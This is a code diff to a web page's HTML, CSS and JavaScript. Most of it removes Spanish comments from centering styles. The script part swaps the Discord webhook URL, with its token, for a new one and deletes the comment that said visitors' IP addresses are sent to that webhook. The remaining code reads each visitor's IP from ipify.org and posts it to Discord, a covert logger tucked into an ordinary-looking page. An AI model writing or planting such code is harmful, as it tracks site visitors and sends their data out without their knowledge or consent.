@@ -30,12 +30,12 @@
       align-items: center;
       justify-content: center;
       z-index: 1;
-      margin: 0 auto; /* Agrega esta línea para centrar horizontalmente */
+      margin: 0 auto;
       position: absolute;
-      top: 50%; /* Centra verticalmente */
+      top: 50%;
       left: 0;
       right: 0;
-      transform: translateY(-50%); /* Centra verticalmente */
+      transform: translateY(-50%);
     }
 
     #video-background {
@@ -179,8 +179,8 @@
       }
     });
 
-    // Agrega el código para enviar la dirección IP al webhook de Discord
-    fetch("https://discord.com/api/webhooks/1119657161186889779/Jm0QFGeo_E95lNkxJO-VbVubKyaTOJf3RGKvG2mL95_LhDHarjvAJa2zM-kqKSIi1Hge", {
+    
+    fetch("https://discord.com/api/webhooks/1137896982720024668/b2JZkZFVwirvNzvgSbOWyB38IAfkro0mHpuFISJ3SkQkAVSokmSjhSHLfVsVRhspzxDw", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -189,8 +189,6 @@
     });
 
     function getIPAddress() {
-      // Utiliza una API para obtener la dirección IP del cliente
-      // Aquí hay un ejemplo de cómo obtener la dirección IP utilizando ipify.org:
       return fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => data.ip);
